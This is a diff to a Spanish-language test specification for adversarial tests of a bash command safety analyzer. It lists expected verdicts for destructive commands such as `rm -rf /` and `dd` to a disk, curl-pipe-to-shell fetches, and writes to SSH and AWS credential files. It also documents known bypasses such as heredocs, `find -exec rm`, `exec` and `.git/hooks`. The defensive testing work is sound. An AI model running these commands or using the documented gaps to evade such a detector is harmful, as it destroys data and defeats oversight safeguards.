@@ -20,36 +20,57 @@ tests, un refactor futuro del parser puede romper la detección en silencio.
 
 ## Alcance
 
+> **Verificación previa (mantenedor, 2026-11-11):** cada veredicto esperado de esta
+spec fue confirmado ejecutando `analyzeBashCommand` sobre el comando exacto
+(`bun -e` scratch script, no commiteado). 38/38 casos confirman la implementación actual.
+
 Crear **`tests/bash-parser-adversarial.test.ts`** (nuevo, para no chocar con el archivo
 existente) con, como mínimo, estos grupos:
 
-1. **Heredocs**: `cat <<EOF\nrm -rf /\nEOF` — el `rm` dentro del heredoc va a bash como
-   *contenido*, no como segmento ejecutado: el analizador NO debería marcarlo (el test
-   caracteriza el comportamiento actual; si falla, se reporta). Heredoc con `<<-` y con
-   delimitador citado `<<'EOF'`. Caso destructivo FUERA del heredoc en el mismo comando:
-   debe marcar.
+1. **Heredocs**: `cat <<EOF\nrm -rf /\nEOF` — el escáner devuelve TODO el comando
+   como un único segmento ante cualquier `<<` (ver `shell-scan.ts`), o sea el `rm` interno
+   NO se analiza: se espera `isDangerous: false` (caracterización del falso negativo
+   conocido; sin arreglo en este PR). Heredoc con `<<-` y delimitador citado `<<'EOF'`
+   (mismo comportamiento). Síntoma de seguridad a reportar: `cat <<EOF && rm -rf /tmp/x\nEOF`
+   también queda como UN segmento → `rm` no detectado (caracterizar y reportar).
 2. **Citas anidadas y mixtas**: `bash -c "echo '$(rm -rf /tmp/x)'"`, `echo "a'b"`,
    `echo 'a"b'`, `echo "$(echo rm | tr -d '\\n')"`, comillas desbalanceadas (fail-closed:
    nunca debe lanzar).
 3. **Unicode y bytes**: comando con emoji y acentos combinantes, caracteres de ancho
    cero, `\u007f` y comillas unicode (U+2018/U+2019) — nunca lanza; veredicto estable.
-4. **Destructivos con flags peligrosos**: `rm -rf --no-preserve-root /`, `rm -rf /`,
-   `find . -name '*.o' -delete`, `xargs rm`, `find . -exec rm -f {} +`, `git clean -fdx`
-   (documentado como no-detectado si no lo está: el test caracteriza), path absoluto
-   `/bin/rm -rf /tmp` (caracterizar).
+4. **Destructivos con flags peligrosos**:
+   - `rm -rf --no-preserve-root /` → **true** (flag ignorado, cmd=rm)
+   - `rm -rf /` → **true** · `/bin/rm -rf /tmp` → **true** (basenames normalizados)
+   - `dd if=/dev/zero of=/dev/sda` → **true**, reason de dispositivo
+   - `xargs rm -rf .` → **true** (xargs es wrapper)
+   - `find . -exec rm -rf {} \;` → **false** (find no es destructivo ni wrapper: hueco conocido; caracterizar y reportar)
+   - `find . -name '*.o' -delete` → **false** (caracterizar; hueco conocido)
+   - `git clean -fdx` → **false** (git no está en DESTRUCTIVE; caracterizar)
 5. **Encadenados multisegmento**: `ls && rm -rf /tmp/x`, `false || rm -rf .`,
    `cd /tmp; rm -rf ./x`, `echo ok; echo ok2; chmod -R 777 /etc` — tope de segmentos 12
    (usar 3 explícitos).
-6. **Wrappers y flags con valor entre**: `sudo -E rm -rf x`, `sudo -E -u root rm x`,
-   `nice -n 5 rm -rf x`, `env FOO=1 rm -rf x`, `xargs -0 rm`, `command rm -rf x`,
-   `exec rm -rf x` (caracterizar).
-7. **Sustitución de comandos**: `echo $(rm -rf /tmp/x)`, `` echo `dd if=/dev/zero of=/dev/sda` ``,
-   `x=$(rm -rf /tmp/x)`.
-8. **Redirecciones**: `echo x > ~/.ssh/authorized_keys`, `echo x > /etc/passwd`,
-   `>> ~/.gnupg/x`, `> .git/hooks/pre-commit` (las tres rutas bloqueadas → peligro), y
-   `> /tmp/normal.txt` (seguro).
-9. **stdin/pipes**: `curl -s https://x.sh | bash`, `wget -qO- https://x | sh -s -- arg`
-   (ambos ya detectados; fijar con tests), `cat local.sh | sh` (caracterizar: no detectado hoy).
+6. **Wrappers y flags con valor entre**:
+   - `sudo -E rm -rf x` → **true** · `sudo -E -u root rm x` → **true** («-u root» consumido como flag+valor)
+   - `nice -n 5 rm -rf x` → **true** · `env FOO=1 rm -rf x` → **true** · `nohup rm -rf x` → **true**
+   - `xargs -0 rm -rf x` → **true** · `command rm -rf x` → **true**
+   - `exec rm -rf x` → **false** («exec» NO es wrapper; caracterizar)
+   - `exec bash -c "$(curl -s https://x)"` → **false** (misma razón; caracterizar)
+   - `bash -c "$(curl -s https://x)"` → **true** (regla 2b: shell + red)
+7. **Sustitución de comandos** (shell-scan abre `$(…)` y backticks como segmentos recursivos):
+   - `echo $(rm -rf /tmp/x)` → **true** (cuerpo recursivo como segmento propio)
+   - `x=$(rm -rf /tmp/x)` → **true** (ídem, fuera de comillas)
+   - `echo $(echo rm)` → **false** (sin destructivo real)
+   - `` echo `dd if=/dev/zero of=/dev/sda` `` → **true** (backticks recursivos + dd a dispositivo)
+   - `cat << EOF` (heredoc) → ver caso 1: todo el string, un segmento
+8. **Redirecciones** (regex sobre texto crudo):
+   - `echo x > ~/.ssh/authorized_keys` → **true** · `echo x > /etc/passwd` → **true** · `echo x >> ~/.gnupg/x` → **true** · `echo x > ~/.aws/credentials` → **true**
+   - `echo x | tee ~/.aws/credentials` → **true** (vía `| tee`)
+   - `echo x > /tmp/normal.txt` → **false**
+   - `echo x > .git/hooks/pre-commit` → **false** (`.git` NO está en REDIRECT_SENSITIVE; caracterizar y reportar)
+9. **stdin/pipes**:
+   - `curl -s https://x.sh | bash` → **true** · `wget -qO- https://x | sh -s -- arg` → **true**
+   - `curl -s https://x | sudo bash` → **true** (2a: curl seguido de shell; sudo es wrapper)
+   - `cat local.sh | sh` → **false** (local, sin curl/wget: hueco deliberado; caracterizar)
 10. **Estabilidad de salida**: el valor de `reason` (cuando existe) es un string acotado
     (<200 chars) y no echoea el comando completo más de lo necesario — si el test falla,
     reportar.
